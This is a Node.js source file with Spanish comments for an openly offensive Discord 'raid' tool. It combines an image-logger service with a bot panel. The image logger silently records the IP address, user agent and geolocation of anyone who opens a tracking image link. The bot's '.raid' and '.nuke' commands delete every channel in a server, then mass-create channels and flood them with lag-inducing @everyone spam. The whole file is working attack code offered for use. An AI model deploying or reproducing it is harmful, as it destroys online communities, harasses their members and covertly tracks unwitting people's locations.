const express = require('express');
const { Client, IntentsBitField, ChannelType, Events } = require('discord.js');
const axios = require('axios');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const app = express();

// Configuración
const PORT = process.env.PORT || 8080;

// Crear carpetas necesarias
const dirs = ['./public', './public/uploads'];
dirs.forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// Configuración de multer para imágenes
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, './public/uploads/');
    },
    filename: (req, file, cb) => {
        const uniqueName = Date.now() + '-' + Math.round(Math.random() * 1E9) + path.extname(file.originalname);
        cb(null, uniqueName);
    }
});

const upload = multer({
    storage: storage,
    limits: { fileSize: 10 * 1024 * 1024 }, // 10MB
    fileFilter: (req, file, cb) => {
        if (file.mimetype.startsWith('image/')) {
            cb(null, true);
        } else {
            cb(new Error('Solo imágenes'), false);
        }
    }
});

// Middleware
app.use(express.json());
app.use(express.static('public'));
app.use('/uploads', express.static('public/uploads'));

// Variables globales
let ipLogs = [];
let activeBots = new Map();
let uploadedImages = new Map();

// Configuración predeterminada del raid
const RAID_CONFIG = {
    canales: 50,                    // 50 canales
    mensajesPorCanal: 15,            // 15 mensajes cada uno
    nombreCanal: "IDK-RAIDED",       // Nombre del canal
    mensaje: "@everyone SERVIDOR DESTRUIDO POR IDK TOOL 🔥\n" + "█".repeat(1000) // Mensaje con lag
};

// Ruta principal - Sirve el HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================
// IMAGE LOGGER ENDPOINTS
// ============================================

// Subir imagen
app.post('/api/upload-image', upload.single('image'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'No image uploaded' });
        }

        const imageId = Date.now() + '-' + Math.random().toString(36).substring(7);
        const baseUrl = `${req.protocol}://${req.get('host')}`;
        
        uploadedImages.set(imageId, {
            filename: req.file.filename,
            originalName: req.file.originalname,
            path: req.file.path,
            url: `/uploads/${req.file.filename}`,
            mimetype: req.file.mimetype,
            createdAt: new Date()
        });

        const loggerUrl = `${baseUrl}/image/${imageId}`;

        res.json({
            success: true,
            imageId: imageId,
            loggerUrl: loggerUrl,
            previewUrl: `/uploads/${req.file.filename}`,
            discordPreview: `${baseUrl}/image/${imageId}`
        });

    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Servir imagen con logger
app.get('/image/:imageId', async (req, res) => {
    const imageId = req.params.imageId;
    const imageData = uploadedImages.get(imageId);
    
    // Capturar IP
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "0.0.0.0";
    
    let geo = "Desconocido";
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip.split(',')[0]}`);
        if(response.data.status === 'success') {
            geo = `${response.data.city}, ${response.data.country}`;
        }
    } catch(e) {}

    // Guardar log
    ipLogs.unshift({
        ip: ip.split(',')[0],
        geo: geo,
        date: new Date().toLocaleTimeString(),
        ua: req.headers['user-agent'],
        imageId: imageId,
        timestamp: new Date().toISOString()
    });

    if (ipLogs.length > 100) ipLogs.pop();

    // Servir la imagen
    if (imageData && fs.existsSync(imageData.path)) {
        res.sendFile(path.resolve(imageData.path));
    } else {
        res.redirect('https://via.placeholder.com/400x300?text=Image+Not+Found');
    }
});

// Obtener todas las imágenes
app.get('/api/images', (req, res) => {
    const images = Array.from(uploadedImages.entries()).map(([id, data]) => ({
        id: id,
        originalName: data.originalName,
        url: data.url,
        loggerUrl: `/image/${id}`,
        createdAt: data.createdAt,
        views: ipLogs.filter(log => log.imageId === id).length
    }));
    res.json(images);
});

// Obtener logs de IPs
app.get('/api/ip-logs', (req, res) => {
    res.json(ipLogs);
});

// ============================================
// BOT DE COMANDOS
// ============================================

// Endpoint para iniciar el bot
app.post('/api/start-bot', async (req, res) => {
    const { token } = req.body;
    
    if (!token) {
        return res.status(400).json({ error: "Token requerido" });
    }

    // Verificar si el bot ya está activo
    if (activeBots.has(token)) {
        return res.json({ success: true, message: "El bot ya está activo" });
    }

    const bot = new Client({ 
        intents: [
            IntentsBitField.Flags.Guilds,
            IntentsBitField.Flags.GuildMessages,
            IntentsBitField.Flags.MessageContent,
            IntentsBitField.Flags.GuildMembers
        ] 
    });

    try {
        await bot.login(token);
        
        bot.once('ready', () => {
            console.log(`✅ Bot conectado: ${bot.user.tag}`);
            
            // Configurar el manejador de mensajes
            bot.on(Events.MessageCreate, async (message) => {
                // Ignorar mensajes de bots
                if (message.author.bot) return;
                
                // ============================================
                // COMANDO .raid - HACE TODO Y SE DETIENE
                // ============================================
                if (message.content === '.raid') {
                    await message.reply(`🔥 **INICIANDO ATAQUE COMPLETO** 🔥\n\`\`\`\n📊 FASE 1: ELIMINANDO CANALES EXISTENTES\n📌 FASE 2: CREANDO ${RAID_CONFIG.canales} CANALES\n📝 FASE 3: ENVIANDO ${RAID_CONFIG.mensajesPorCanal} MENSAJES POR CANAL\n⚡ FASE 4: FINALIZANDO\`\`\``);
                    
                    try {
                        const guild = message.guild;
                        let canalesCreados = 0;
                        let mensajesEnviados = 0;
                        let canalesEliminados = 0;

                        // ============================================
                        // FASE 1: ELIMINAR TODOS LOS CANALES EXISTENTES (NUKE)
                        // ============================================
                        const channels = await guild.channels.fetch();
                        for (const [id, channel] of channels) {
                            if (channel.deletable) {
                                await channel.delete().catch(() => {});
                                canalesEliminados++;
                            }
                        }

                        // ============================================
                        // FASE 2: CREAR 50 CANALES
                        // ============================================
                        for (let i = 0; i < RAID_CONFIG.canales; i++) {
                            try {
                                const channel = await guild.channels.create({
                                    name: `${RAID_CONFIG.nombreCanal}-${i}`,
                                    type: ChannelType.GuildText
                                });
                                canalesCreados++;

                                // ============================================
                                // FASE 3: ENVIAR 15 MENSAJES POR CANAL
                                // ============================================
                                for (let j = 0; j < RAID_CONFIG.mensajesPorCanal; j++) {
                                    await channel.send(RAID_CONFIG.mensaje).catch(() => {});
                                    mensajesEnviados++;
                                }

                            } catch (e) {
                                console.log(`Error creando canal: ${e.message}`);
                            }
                        }

                        // ============================================
                        // FASE 4: REPORTE FINAL (NO DEJA SPAM INFINITO)
                        // ============================================
                        await message.channel.send(`✅ **ATAQUE COMPLETADO - BOT DETENIDO** ✅\n\`\`\`\n🗑️ CANALES ELIMINADOS: ${canalesEliminados}\n📌 CANALES CREADOS: ${canalesCreados}\n💬 MENSAJES ENVIADOS: ${mensajesEnviados}\n⚡ ESTADO: FINALIZADO (SIN SPAM INFINITO)\n\`\`\`\n🛑 **EL BOT SIGUE ACTIVO PARA MÁS COMANDOS**`);

                    } catch (e) {
                        await message.channel.send(`❌ Error: ${e.message}`);
                    }
                }
                
                // ============================================
                // COMANDO .nuke - SOLO ELIMINAR CANALES
                // ============================================
                else if (message.content === '.nuke') {
                    await message.reply('💥 **ELIMINANDO TODOS LOS CANALES**...');
                    
                    try {
                        const channels = await message.guild.channels.fetch();
                        let eliminados = 0;
                        
                        for (const [id, channel] of channels) {
                            if (channel.deletable) {
                                await channel.delete().catch(() => {});
                                eliminados++;
                            }
                        }
                        
                        await message.channel.send(`✅ **NUKE COMPLETADO**\n\`\`\`\n🗑️ CANALES ELIMINADOS: ${eliminados}\`\`\``);
                        
                    } catch (e) {
                        await message.channel.send(`❌ Error: ${e.message}`);
                    }
                }
                
                // ============================================
                // COMANDO .stop - DETENER BOT COMPLETAMENTE
                // ============================================
                else if (message.content === '.stop' || message.content === '.off') {
                    await message.reply('🛑 **DETENIENDO BOT PERMANENTEMENTE**...');
                    
                    // Buscar y eliminar este bot
                    for (const [t, botData] of activeBots.entries()) {
                        if (botData.userTag === bot.user.tag) {
                            activeBots.delete(t);
                            break;
                        }
                    }
                    
                    await message.channel.send('✅ Bot desconectado. Para usarlo de nuevo, inícialo desde la web.');
                    await bot.destroy();
                }
                
                // ============================================
                // COMANDO .servers - LISTAR SERVIDORES
                // ============================================
                else if (message.content === '.servers') {
                    const guilds = bot.guilds.cache;
                    let serverList = '**📡 SERVIDORES:**\n```\n';
                    guilds.forEach(g => {
                        serverList += `- ${g.name} (${g.memberCount} miembros)\n`;
                    });
                    serverList += '```';
                    await message.reply(serverList);
                }
                
                // ============================================
                // COMANDO .ping - VER LATENCIA
                // ============================================
                else if (message.content === '.ping') {
                    const ping = Date.now() - message.createdTimestamp;
                    await message.reply(`🏓 **PONG!** Latencia: ${ping}ms`);
                }
                
                // ============================================
                // COMANDO .help - MOSTRAR AYUDA
                // ============================================
                else if (message.content === '.help') {
                    const helpMsg = `
**🛠️ COMANDOS DISPONIBLES:**
\`\`\`
.raid    - Ataque completo: NUKE + 50 canales + 15 mensajes (se detiene solo)
.nuke    - Solo elimina todos los canales del servidor
.stop    - Detiene el bot permanentemente
.off     - Lo mismo que .stop
.servers - Lista todos los servidores del bot
.ping    - Muestra la latencia
.help    - Muestra esta ayuda
\`\`\`
⚙️ **CONFIGURACIÓN ACTUAL:**
\`\`\`
📊 Canales a crear: ${RAID_CONFIG.canales}
📝 Mensajes por canal: ${RAID_CONFIG.mensajesPorCanal}
📌 Nombre del canal: ${RAID_CONFIG.nombreCanal}
⚡ Spam infinito: ❌ NO (se detiene automáticamente)
\`\`\``;
                    await message.reply(helpMsg);
                }
            });
            
            console.log(`👂 Bot escuchando comandos en ${bot.guilds.cache.size} servidores`);
        });

        // Guardar el bot en el mapa de activos
        activeBots.set(token, {
            client: bot,
            userTag: bot.user?.tag || 'Desconocido',
            startedAt: new Date().toISOString()
        });

        res.json({ 
            success: true, 
            message: "✅ Bot iniciado correctamente",
            user: bot.user?.tag,
            config: RAID_CONFIG
        });

    } catch (err) { 
        console.error('Error iniciando bot:', err);
        res.status(401).json({ error: "Token Inválido: " + err.message }); 
    }
});

// Endpoint para detener bot
app.post('/api/stop-bot', async (req, res) => {
    const { token } = req.body;
    
    const botData = activeBots.get(token);
    
    if (botData) {
        try {
            await botData.client.destroy();
            activeBots.delete(token);
            res.json({ success: true, message: "✅ Bot detenido" });
        } catch (e) {
            res.json({ success: false, message: "Error deteniendo bot" });
        }
    } else {
        res.json({ success: false, message: "❌ Bot no encontrado" });
    }
});

// Obtener servidores del bot
app.post('/api/get-guilds', async (req, res) => {
    const { token } = req.body;
    
    const botData = activeBots.get(token);
    
    if (botData) {
        const guilds = botData.client.guilds.cache.map(guild => ({
            id: guild.id,
            name: guild.name,
            memberCount: guild.memberCount,
            icon: guild.iconURL()
        }));
        return res.json({ success: true, guilds });
    }
    
    // Si no está activo, crear instancia temporal
    const tempBot = new Client({ intents: [IntentsBitField.Flags.Guilds] });

    try {
        await tempBot.login(token);
        
        tempBot.once('ready', async () => {
            const guilds = tempBot.guilds.cache.map(guild => ({
                id: guild.id,
                name: guild.name,
                memberCount: guild.memberCount,
                icon: guild.iconURL()
            }));
            
            await tempBot.destroy();
            res.json({ success: true, guilds });
        });

    } catch (err) { 
        res.status(401).json({ error: "Token Inválido" }); 
    }
});

// Obtener bots activos
app.get('/api/active-bots', (req, res) => {
    const bots = [];
    activeBots.forEach((data, token) => {
        bots.push({
            token: token.substring(0, 20) + "...",
            user: data.userTag,
            startedAt: data.startedAt,
            servers: data.client?.guilds?.cache?.size || 0
        });
    });
    res.json(bots);
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
    console.log(`📁 Carpeta uploads: ${path.resolve('./public/uploads')}`);
    console.log(`🤖 Configuración RAID:`);
    console.log(`   - Canales: ${RAID_CONFIG.canales}`);
    console.log(`   - Mensajes por canal: ${RAID_CONFIG.mensajesPorCanal}`);
    console.log(`   - Nombre canal: ${RAID_CONFIG.nombreCanal}`);
    console.log(`   - Spam infinito: NO (se detiene automáticamente)`);
});
